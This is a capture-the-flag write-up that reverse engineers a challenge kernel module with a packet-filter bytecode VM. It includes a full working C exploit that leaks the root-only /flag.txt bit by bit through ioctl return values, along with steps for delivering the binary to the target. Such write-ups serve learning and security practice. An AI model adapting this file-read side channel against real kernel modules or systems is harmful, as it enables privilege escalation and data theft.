---
title: Better Packet Filter
author: bytebrew
layout: writeup
category: USCG-2025
chall_description:
points: 500
solves: 0
tags: rev
date: 2025-06-10
comments: false
---

# Overview
We are tasked with reverse engineering a kernel module and leaking the flag (placed at `/flag.txt`). We are given shell access to an Alpine image as a user and have to obtain a file read using the kernel module. The kernel module itself is compiled for aarch64 and is not stripped.
# Initial Analysis
The init_module function is as follows:
```c
int __cdecl init_module()
{
  int result; // w0

  if ( proc_create("filter", 438LL, 0LL, &proc_ops_0) )
    return 0;
  __break(0x800u);
  cleanup_module();
  return result;
}
```
This allows the user to interact with the kernel module by accessing `/proc/filter`. The next function is:
```c
__int64 __fastcall device_ioctl(file *_f, unsigned int cmd, program *arg)
{
  char *v3; // x19

  if ( cmd == 0x40086601 )
    return set_program(arg);
  if ( cmd == 0x40086602 )
    return should_drop(v3);
  return -22LL;
}
```
So we need to call ioctl with a file descriptor and either `0x40086601` (for `set_program`) or `0x40086602` (for `should_drop`) and an additional argument to pass to either of the functions.
# Analysis of `set_program`
This is a large function, but most of it is error handling, so I'll only show key parts:
```c
__int64 __fastcall set_program(program *user_program)
{
...
  if ( (v5 & 0x200000) != 0 || (v6 = (unsigned __int64)user_program, (*(_QWORD *)v4 & 0x4000000) != 0) )
    v6 = (unsigned __int64)user_program & ((__int64)((_QWORD)user_program << 8) >> 8);
  if ( v6 > 0xFFFFFFFFFFFF0LL )
    goto LABEL_19;
  v15 = v1;
  v16 = v2;
  if ( _arch_copy_from_user(&p, (unsigned __int64)user_program & 0xFF7FFFFFFFFFFFFFLL, 16LL) )
  {
    v1 = v15;
    v2 = v16;
LABEL_19:
    result = -14LL;
    goto LABEL_15;
  }
  if ( p.len > 0x1000 )
  {
    v1 = v15;
    v2 = v16;
    result = -22LL;
    goto LABEL_15;
  }
  v7 = (char *)_kmalloc_noprof();
  if ( !v7 )
  {
    v1 = v15;
    v2 = v16;
    result = -12LL;
    goto LABEL_15;
  }
  len = p.len;
  if ( p.len > 0x7FFFFFFF )
  {
    __break(0x800u);
    goto LABEL_27;
  }
  v9 = _ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0));
  code = (size_t)p.code;
  if ( (*(_DWORD *)(v9 + 44) & 0x200000) != 0 || (*(_QWORD *)v9 & 0x4000000) != 0 )
    code = (__int64)p.code & ((__int64)p.code << 8 >> 8);
  if ( code <= 0x10000000000000LL - p.len )
  {
    v12 = _arch_copy_from_user(v7, (unsigned __int64)p.code & 0xFF7FFFFFFFFFFFFFLL, p.len);
    if ( !v12 )
      goto LABEL_12;
...
LABEL_12:
  if ( current_program.code )
    kfree(current_program.code);
  current_program.code = (uint8_t *)v7;
  current_program.len = p.len;
  ...
```
All this does is set the global data containing the `current_program` to the user-supplied bytes. But what is the `current_program` for? Looking at cross references we can see it is used in `should_drop` a lot, the other function we can call. Let's analyze that.
# Analysis of `should_drop`
The function itself looks pretty simple:
```c
__int64 __fastcall should_drop(char *a1)
{
  __int64 result; // x0
  char buf[256]; // [xsp+8h] [xbp-108h] BYREF
  __int64 v5; // [xsp+108h] [xbp-8h]

  v5 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0)) + 1240);
  memset(buf, 0, sizeof(buf));
  if ( current_program.code )
  {
    if ( strncpy_from_user(buf, a1, 256LL) < 0 )
      result = -14LL;
    else
      result = spawn_filter_thread(a1);
  }
  else
  {
    result = -22LL;
  }
  _ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0));
  return result;
}
```
All it does is call `spawn_filter_thread` with the user-supplied array (with some error handling). Let's see what the `spawn_filter_thread` does:
```c
unsigned __int64 __fastcall spawn_filter_thread(char *a1)
{
  unsigned __int64 result; // x0
  unsigned __int64 v4; // x19
  thread_args args; // [xsp+8h] [xbp-38h] BYREF
  __int64 v6; // [xsp+18h] [xbp-28h] BYREF
  _QWORD v7[4]; // [xsp+20h] [xbp-20h] BYREF

  v7[3] = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0)) + 1240);
  v6 = 0LL;
  memset(v7, 0, 24);
  _init_swait_queue_head(v7, "&x->wait", &_key_0);
  args.filename = a1;
  args.done = (completion *)&v6;
  result = kthread_create_on_node(should_drop_inner, &args, 0xFFFFFFFFLL, "should_drop_inner");
  v4 = result;
  if ( result <= 0xFFFFFFFFFFFFF000LL )
  {
    wake_up_process();
    wait_for_completion(&v6);
    result = kthread_stop(v4);
  }
  _ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0));
  return result;
}
```
Based on the variable names (derived from dwarf information) it can be concluded that the user-supplied array is supposed to be a filename, and this code execute `should_drop_inner` with that filename. `should_drop_inner` is as follows:
```c
__int64 __fastcall should_drop_inner(__int64 *a1, __int64 a2, void *args)
{
  __int64 v3; // x19
  __int64 v4; // x21
  unsigned __int64 v5; // x0
  unsigned __int64 v6; // x19
  __int64 v7; // x20
  uint8_t dest[256]; // [xsp+8h] [xbp-108h] BYREF
  __int64 v10; // [xsp+108h] [xbp-8h]

  v10 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0)) + 1240);
  v3 = *a1;
  v4 = a1[1];
  memcpy(dest, &unk_AA0, sizeof(dest));
  v5 = filp_open(v3, 0LL, 0LL);
  v6 = v5;
  if ( v5 <= 0xFFFFFFFFFFFFF000LL )
  {
    v7 = kernel_read(v5);
    filp_close(v6, 0LL);
    if ( v7 < 0 )
      LODWORD(v6) = -5;
    else
      LODWORD(v6) = execute_filter(dest, 0x100uLL, (__int64)current_program.code, current_program.len);
  }
  complete(v4);
  _ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0));
  return (unsigned int)v6;
}
```
This reads the user-supplied file and runs `execute_filter` with that data (though it is unclear from the decompilation). The `execute_filter` function is as follows:
```c
__int64 __fastcall execute_filter(uint8_t *packet, size_t packet_len, __int64 a3, size_t program_len)
{
  __int64 v4; // x8
  size_t v5; // x7
  unsigned int pc; // w2
  instruction v7; // w1
  state v8; // w0
  __int64 result; // x0
  interpreter vm; // [xsp+0h] [xbp-30h] BYREF
  __int64 v11; // [xsp+28h] [xbp-8h]

  v4 = a3;
  v5 = program_len >> 2;
  v11 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0)) + 1240);
  pc = 0;
  memset(&vm, 0, 24);
  vm.regs.sp = packet_len;
  vm.packet = packet;
  vm.packet_len = packet_len;
  while ( pc < v5 )
  {
    v7 = *(instruction *)(v4 + 4LL * pc);
    vm.pc = pc;
    v8 = eval_insn(&vm, v7);
    if ( v8 == state::STATE_ACCEPT )
    {
      result = 0LL;
      goto LABEL_8;
    }
    if ( v8 == state::STATE_DROP )
    {
      result = 1LL;
      goto LABEL_8;
    }
    if ( v8 == state::STATE_ERR )
      break;
    pc = vm.pc;
  }
  result = -22LL;
LABEL_8:
  _ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0));
  return result;
}
```
This runs a VM that is supplied with the data from the user-supplied file. The bytecode for the VM itself can be traced back to the call `execute_filter(dest, 0x100uLL, (__int64)current_program.code, current_program.len);` confirming that `set_program` allows us to set our own bytecode.
# VM Analysis
There is somewhere around 50 instructions. To save some space on this already code-filled writeup I will just review the few that I used:
```c
    case operation::OP_LDR_IMM:
      if ( (insn.imm & 1) != 0 || vm->packet_len <= insn.imm )
        return -1;
      p_r4->r0 = *(_WORD *)&vm->packet[insn.imm];
      goto LABEL_23;
```
What this does is that it loads 2 bytes from the packet, specified by an immediate value, into a specified register. This is how we will actually read the `/flag.txt` in our bytecode.
```c
    case operation::OP_AND_IMM:
      p_r4->r0 &= insn.imm;
      goto LABEL_23
```
This is just an `and` instruction with an immediate and a register, it's useful for bit by bit comparisons using the next instruction: 
```c
    case operation::OP_CMP_IMM:
      vm->flags.eq = p_r4->r0 == insn.imm;
      vm->flags.gt = p_r4->r0 > (unsigned int)insn.imm;
      goto LABEL_23;
```
This is just a comparison instruction, it allows us to take different actions based on the packet value. 
```c
    case operation::OP_BNE_IMM:
      if ( !vm->flags.eq )
        goto LABEL_32;
      goto LABEL_23;
...
	LABEL_32:
        vm->pc = insn.imm;
        result = state::STATE_CONTINUE;
      }
```
This allows us to branch to an absolute address based on the result of the comparison function.
```c
    case operation::OP_ACCEPT:
      return 0;
    case operation::OP_DROP:
      return 1;
```
These are the two most simple instructions, they allow us to return either a `1` or a `0` to the user. This is crucial for giving information to the user. 
# Bytecode Construction
So here is what we have: `ldr`, `and`,  `cmp`, `bne`, `accept`, and `drop`. In order to leak information, we can do the following:
1. Load the 2 bytes from offset `y` from `/flag.txt`
2. Perform the `and` operation with the 2 bytes and `x`
3. Compare the 2 bytes (after the `and` operation) and `x`
4. If they are equal, we return 1
5. If they are not, we return 2
6. Repeat 1-5 doubling `x` until it reaches `65536`, then we set to 0 and move on to 7
7. Repeat, adding 2 to `y` until an error occurs (meaning we have leaked everything)
This is great! But how do we turn this into bytecode? Since the VM is a large switch statement, we can (correctly) assume that the switch number for each instruction is the instruction byte. Next we can review the VM loop:
```c
  while ( pc < v5 )
  {
    v7 = *(instruction *)(v4 + 4LL * pc);
    vm.pc = pc;
    v8 = eval_insn(&vm, v7);
    if ( v8 == state::STATE_ACCEPT )
    {
      result = 0LL;
      goto LABEL_8;
    }
    if ( v8 == state::STATE_DROP )
    {
      result = 1LL;
      goto LABEL_8;
    }
    if ( v8 == state::STATE_ERR )
      break;
    pc = vm.pc;
  }
```
You may notice that 4 bytes are multiplied by the program counter in order to obtain the current instruction, leading to the assumption that each instruction is 32 bits. Going back to the VM, we can find out the following information:

| 0-7 bits    | 8-11 bits       | 12-15 bits | 16-32 bits       |
| ----------- | --------------- | ---------- | ---------------- |
| instruction | destination reg | source reg | source immediate |
Going back to our intended program, we can craft the following:
```c
47 0 0 y // load packet at offset y into r0
19 0 0 x // and r0 with x
23 0 0 x // compare r0 to x
31 0 0 7 // jump to return 1 if not equal, otherwise continue
0 0 0 0 // return 0
1 0 0 0 // return 1 sled (in case absolute jump is off)
1 0 0 0
1 0 0 0
```
With this in hand we can finally create a solve script.
# Solve
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

// Reverse-engineered ioctl commands
#define IOCTL_SET_PROGRAM 0x40086601
#define IOCTL_RUN_FILTER  0x40086602

// Helper to construct a 32-bit VM instruction
uint32_t build_insn(uint8_t opcode, uint8_t dst_reg, uint8_t src_reg, uint32_t imm) {
    uint32_t insn = 0;
    insn |= (uint64_t)opcode;
    insn |= (uint64_t)dst_reg << 8;
    insn |= (uint64_t)src_reg << 12;
    insn |= (uint64_t)imm << 16;
    return insn;
}

// The user-space structure to pass to set_program
struct program_user {
    uint64_t prog_ptr;
    uint64_t prog_len;
};

// Global file descriptor for the device
int fd;

// Loads program bytecode
void set_program(uint32_t* prog, uint64_t len) {
    struct program_user user_prog = {
        .prog_ptr = (uint64_t)prog,
        .prog_len = len,
    };
    if (ioctl(fd, IOCTL_SET_PROGRAM, &user_prog) != 0) {
        perror("ioctl(SET_PROGRAM) failed");
        exit(EXIT_FAILURE);
    }
}

// runs the VM code against the "packets"
int run_filter() {
    int ret = ioctl(fd, IOCTL_RUN_FILTER, "/flag.txt");
    if (ret < 0) {
        perror("ioctl(RUN_FILTER) failed");
        exit(EXIT_FAILURE);
    }
    return ret;
}

// leaks a bit
int leak_bit(int offset, int bit) {
    uint32_t prog[10];
    int pc = 0;
    prog[pc++] = build_insn(47, 0, 0, offset); // load packet byte into r0
    prog[pc++] = build_insn(19, 0, 0, bit); // and r0 and constent
    prog[pc++] = build_insn(23, 0, 0, bit); // compare constant with r0
    prog[pc++] = build_insn(31, 7, 0 ,7); // if not equal jump to return 1
    prog[pc++] = build_insn(0, 0, 0, 0); // return 0
    prog[pc++] = build_insn(1, 0, 0, 0); // return 1 (small sled due to uncertainty about jump)
    prog[pc++] = build_insn(1, 0, 0, 0);
    prog[pc++] = build_insn(1, 0, 0, 0);


    set_program(prog, 1000); // 1000 was chosen at random, it was found to be large enough
    return run_filter();
}

// Bits  are leaked in reverse order, so we have to swap them afterwards
uint8_t reverse8(uint8_t b) {
    b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
    b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
    b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
    return b;
}

uint16_t flip_8bits_each_side(uint16_t x) {
    uint8_t high = reverse8(x >> 8);
    uint8_t low = reverse8(x & 0xFF);
    return (high << 8) | low;
}


int main() {
    fd = open("/proc/filter", O_RDONLY);
    if (fd < 0) {
        perror("Failed to open /proc/filter");
        return 1;
    }
    setbuf(stdout, NULL);
    int i = 1;
    int a = 0;
    char tmp = 0;
    uint16_t chunk = 0;
    while (1) { // run until error
        printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b");
        while ( i < 65536) { // leak 2 bytes
            usleep(10000); // dramatic effect
		    chunk <<= 1;
            tmp = leak_bit(a, i)^1;
        	chunk |= tmp;
            printf("%d", tmp);
	        i *= 2;
        }
	    chunk = flip_8bits_each_side(chunk);
        printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b%c%c              ", chunk >> 8, chunk & 0xff);
        i = 1; // reset bit leaker
        a += 2; // add on 2 bytes
    }
}
```
To compile this, run: `aarch64-linux-gnu-gcc better_packet_filter_solve.c -Os -static`, it is crucial that you statically link the code because our target is Alpine, which uses musl instead of libc, so a dynamically linked binary would not execute. The resulting file is big though, (harder to send to our target) at `881k`. To shrink it we can use `upx`, shrinking it to `378k`. To send it to the server I used `base64 a.out | wl-copy` to copy the base64 encoded version of the file onto my clipboard. On the server, I executed `stty -echo` which prevents alpine from being as noisy during the next step. I then ran `echo '<paste>' > o`, which put the base64 of our binary into `o`. I then ran `cat o | base64 -d > l` (decoding it) and finally `chmod +x l; ./l` (executing it). The server then responded with:
```
~ $ ./l
SVUSCG{b3t73r_1n7erpr37er_7h@n_83rke1ey}0101000000000000
ioctl(RUN_FILTER) failed: Invalid argument
```
